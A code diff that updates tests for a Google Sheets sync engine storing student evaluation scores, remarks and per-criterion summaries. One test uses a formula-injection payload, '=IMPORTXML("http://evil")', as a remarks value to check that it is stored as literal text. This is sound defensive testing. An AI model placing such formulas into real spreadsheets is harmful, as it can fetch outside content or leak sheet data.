@@ -72,12 +72,34 @@ class FakeSheets implements SheetsApi {
 }
 
 const tab = { title: "Evaluations", headers: TABS.EVALUATION.headers };
+const criteria = [{ id: "c1", name: "Innovation", max_marks: 10 }];
 const record = (key: string, score: number, remarks = "ok") =>
   evaluationRecord(
-    { id: key, score, remarks, status: "COMPLETED", submitted_at: "2026-10-08T05:00:00Z", updated_at: "2026-10-08T05:00:00Z" },
-    { register_number: `R-${key}`, name: `Student ${key}` },
-    { name: "Evaluator A" },
+    {
+      evaluation_id: key,
+      status: "COMPLETED",
+      total_score: score,
+      max_total: 10,
+      remarks,
+      started_at: "2026-10-08T05:00:00Z",
+      submitted_at: "2026-10-08T05:00:00Z",
+      updated_at: "2026-10-08T05:00:00Z",
+      student_id: `s-${key}`,
+      register_number: `R-${key}`,
+      student_name: `Student ${key}`,
+      department: "CSE",
+      evaluator_id: "e1",
+      evaluator_name: "Evaluator A",
+      scores: { c1: score },
+      domain_ids: [],
+      domains: "GenAI",
+    },
+    criteria,
   );
+// Column positions in the Evaluations tab.
+const TOTAL = 4;
+const SUMMARY = 7;
+const REMARKS = 9;
 
 describe("columnLetter", () => {
   it.each([
@@ -105,7 +127,7 @@ describe("sheets engine", () => {
     });
     const rows = api.tabs.get("Evaluations")!;
     expect(rows).toHaveLength(4);
-    expect(rows[1].slice(3, 5)).toEqual([9, "revised"]);
+    expect([rows[1][TOTAL], rows[1][REMARKS], rows[1][SUMMARY]]).toEqual([9, "revised", "Innovation: 9/10"]);
     expect(rows.map((r) => r.at(-1))).toEqual(["Sync Key", "a", "b", "c"]);
   });
 
@@ -119,7 +141,7 @@ describe("sheets engine", () => {
     await upsertKeyedRows(api, tab, batch);
     expect(api.tabs.get("Evaluations")).toEqual(snapshot);
     expect(snapshot).toHaveLength(3);
-    expect(snapshot![1][3]).toBe(6); // last write in a batch wins
+    expect(snapshot![1][TOTAL]).toBe(6); // last write in a batch wins
   });
 
   it("finds existing rows even if the sheet was re-ordered manually", async () => {
@@ -129,8 +151,8 @@ describe("sheets engine", () => {
     const g = api.tabs.get("Evaluations")!;
     [g[1], g[2]] = [g[2], g[1]];
     await upsertKeyedRows(api, tab, [record("a", 10)]);
-    expect(g[2][3]).toBe(10);
-    expect(g[1][3]).toBe(2);
+    expect(g[2][TOTAL]).toBe(10);
+    expect(g[1][TOTAL]).toBe(2);
   });
 
   it("propagates API failures so the queue can retry, then succeeds", async () => {
@@ -146,7 +168,7 @@ describe("sheets engine", () => {
     const api = new FakeSheets();
     await ensureTabs(api, [tab]);
     await upsertKeyedRows(api, tab, [record("a", 5, '=IMPORTXML("http://evil")')]);
-    expect(api.tabs.get("Evaluations")![1][4]).toBe('=IMPORTXML("http://evil")');
+    expect(api.tabs.get("Evaluations")![1][REMARKS]).toBe('=IMPORTXML("http://evil")');
   });
 
   it("replaceTable rewrites derived tabs and clears leftover rows", async () => {
@@ -154,11 +176,11 @@ describe("sheets engine", () => {
     const results = { title: "Results", headers: TABS.RESULTS.headers };
     await ensureTabs(api, [results]);
     await replaceTable(api, results, [
-      [1, "A", "a", "CSE", 9, 1],
-      [2, "B", "b", "CSE", 8, 1],
-      [3, "C", "c", "CSE", 7, 1],
+      [1, "A", "a", "CSE", 9, 10, "90%", "", "E"],
+      [2, "B", "b", "CSE", 8, 10, "80%", "", "E"],
+      [3, "C", "c", "CSE", 7, 10, "70%", "", "E"],
     ]);
-    await replaceTable(api, results, [[1, "C", "c", "CSE", 10, 2]]);
-    expect(api.tabs.get("Results")).toEqual([[...TABS.RESULTS.headers], [1, "C", "c", "CSE", 10, 2]]);
+    await replaceTable(api, results, [[1, "C", "c", "CSE", 10, 10, "100%", "", "E"]]);
+    expect(api.tabs.get("Results")).toEqual([[...TABS.RESULTS.headers], [1, "C", "c", "CSE", 10, 10, "100%", "", "E"]]);
   });
 });
